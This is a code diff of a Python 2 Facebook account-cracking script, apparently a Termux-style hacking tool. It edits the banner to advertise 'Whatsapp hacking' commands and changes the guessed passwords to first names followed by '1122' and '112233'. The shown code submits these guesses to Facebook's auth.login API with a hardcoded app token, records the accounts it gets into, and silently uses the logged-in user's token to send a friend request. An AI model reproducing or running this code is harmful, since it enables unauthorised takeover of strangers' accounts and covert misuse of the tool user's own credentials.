@@ -61,8 +61,8 @@ logo = """
 \033[1;90m💠 ⚌⚌⚌⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 💠 
 \033[1;96m■▇▇═╌ R E M E M B E R╌═▇▇■
 \033[1;37mDo not use any illegal
-\033[1;38mOnly education promote
-\033[1;39mi'm not responsibility for you
+\033[1;38mWhatsapp hacking commond also availbe
+\033[1;39mArbabMemon(my All commonds Daily Update)
 \033[1;96m■▇▇═╌ A R B A B A L I ╌═▇▇■
 \033[1;90m💠 ⚌⚌⚌⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 💠 
 
@@ -137,10 +137,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Arbabmemon')
+            os.system('xdg-open https://www.facebook.com/profile.php?id=100013198384353')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Arbabmemon')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100013198384353')
 
 def login():
 	os.system('clear')
@@ -181,7 +181,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/chocoxkainat')
+				os.system('xdg-open https://www.facebook.com/profile.php?id=100013198384353')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -413,7 +413,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '12345678'
+													pass6 = b['first_name'] + '1122'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -427,7 +427,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = b['first_name'] +'123456'
+															pass7 = b['first_name'] +'112233'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
